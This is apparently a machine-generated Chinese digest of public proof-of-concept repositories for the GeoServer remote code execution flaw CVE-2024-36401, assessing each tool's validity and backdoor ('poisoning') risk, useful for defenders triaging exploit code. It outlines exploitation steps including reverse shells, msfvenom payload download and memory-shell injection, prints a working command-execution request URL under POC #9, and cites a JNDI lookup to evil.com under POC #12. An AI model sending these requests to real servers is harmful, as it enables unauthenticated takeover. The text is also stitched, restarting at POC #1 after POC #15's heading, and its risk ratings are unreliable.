根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

